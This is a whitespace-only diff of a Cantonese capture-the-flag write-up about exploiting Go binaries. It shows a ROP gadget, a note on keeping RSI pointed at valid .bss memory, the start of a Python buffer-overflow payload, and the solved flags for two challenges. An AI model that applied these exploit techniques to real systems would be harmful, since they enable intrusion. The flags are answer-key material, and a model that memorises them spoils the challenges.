@@ -19,10 +19,13 @@
 ```C
 #0x0000000000413d6d : pop rdx ; xor ah, byte ptr [rsi - 9] ; ret
 ```
+
 就要保證RSI 唔係等於0x0 , 
 
 所以就要去bss 段求其塞d valid memory address去個d 相關register:
+
 For example:
+
 ```python
 payload="A"*256
 #0x0000000000413d6d : pop rdx ; xor ah, byte ptr [rsi - 9] ; ret
@@ -55,8 +58,6 @@ infant-gogogo: BAMBOOFOX{G0LaNg_iS_aw3s0m3ls!}
 infant-gotoheaven : BAMBOOFOX{GOLANG_PWnnnnnnnIng_iS_r3A11Y_W3iRdO_O}
 
 ```
-
-
 
 # Reference
 
